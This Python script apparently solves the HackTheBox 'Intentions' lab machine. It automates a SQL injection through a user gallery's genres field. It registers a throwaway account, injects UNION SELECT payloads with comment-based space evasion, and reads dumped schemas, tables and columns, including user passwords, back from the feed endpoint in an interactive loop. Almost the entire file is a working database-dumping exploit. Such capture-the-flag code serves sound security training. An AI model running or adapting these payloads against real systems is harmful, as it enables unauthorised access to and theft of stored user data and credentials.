#!/usr/bin/env python3

'''
HTB Intentions (HTB)
--------------------
Description: SQL injection when updating and displaying a user's gallery by gender
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 26, Sep 2023
'''


from argparse import ArgumentParser, RawDescriptionHelpFormatter
from json import loads
from random import choices
from requests import Session
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv

import pdb

# Ctrl + C
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit: 

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):

        self.args = args
        self.target = {'base_url':'http://10.10.11.220'}
        self.temp_data = self.get_rand_str(5)

        # Session
        self.session = Session()
        # Proxies
        self.proxies = {'http':'127.1:8080'}
        #self.session.proxies.update(self.proxies)

    def run(self):

        if self.target_response():
            self.register()
            self.login()

            if self.args.mode == 'dump':
                
                query = input('\n> ')
                while query != 'exit':
                    gen_query = self.generate_query(query)
                    self.send_query(gen_query)
                    self.show_query_response()

                    query = input('\n> ')
        
    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')

            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        
        except ConnectionError:
            exit('\n[x] Check the machine connection')

    def register(self):

        try:
            post_data = {
                'email': '{0}@{0}.{0}'.format(self.temp_data),
                'password': f'{self.temp_data}',
                'name': f'{self.temp_data}',
                'password_confirmation': f'{self.temp_data}'
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/auth/register',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                exit('\n[x] Registration error.')
            
            print('[*] Credentials: {0}:{0}'.format(self.temp_data))

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def login(self):

        try:
            post_data = {
                'email': '{0}@{0}.{0}'.format(self.temp_data),
                'password': f'{self.temp_data}'
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/auth/login',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                print('\n[x] Login error.')
            
            print('[+] Successful login')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def generate_query(self, query: str) -> str:

        query = query.split()
        mode = len(query)

        if mode == 4:
            database, tables, columns = query[1], query[2], query[3]
            query = f"') union select null,group_concat(0x7c,{columns},0x7c),null,null,null from {database}.{tables}#"
        elif mode == 3:
            database, tables = query[1], query[2]
            query = f"') union select null,group_concat(0x7c,column_name,0x7c),null,null,null from information_schema.columns where table_name='{tables}' and table_schema='{database}'#"
        elif mode == 2:
            database = query[1]
            query = f"') union select null,group_concat(0x7c,table_name,0x7c),null,null,null from information_schema.tables where table_schema='{database}'#"
        elif mode == 1 and query[0] == 'dump':
            query = "') union select null,group_concat(0x7c,schema_name,0x7c),null,null,null from information_schema.schemata#"
        else:
            query = ''
        
        return query.replace(' ', '/**/')
        
    def send_query(self, query: str):
        
        try:
            post_data = {
                'genres': query
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/gallery/user/genres',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                exit('\n[x] Error sending query.')
            
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def show_query_response(self):
        
        try:
            response = self.session.get(self.target['base_url'] + '/api/v1/gallery/user/feed')
            
            if not response.ok or loads(response.text)['status'] != 'success':
                exit('\n[x] Something went wrong, try again.')
            
            query_response = loads(response.text)['data'][0]['file']
            if query_response == None:
                print('\n[x] No data.')
                return

            print()
            for line in query_response.split(','):
                print(line)

        except IndexError:
            print('\n[!] Invalid command')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| Intentions SQLi |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} dump (interactive)
        > dump 
        > dump intentions
        > dump intentions users
        > dump intentions users password
        ''')

    subparser = parser.add_subparsers(dest='mode', required=True)
    slqi_parser = subparser.add_parser('dump', help='Dump database')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()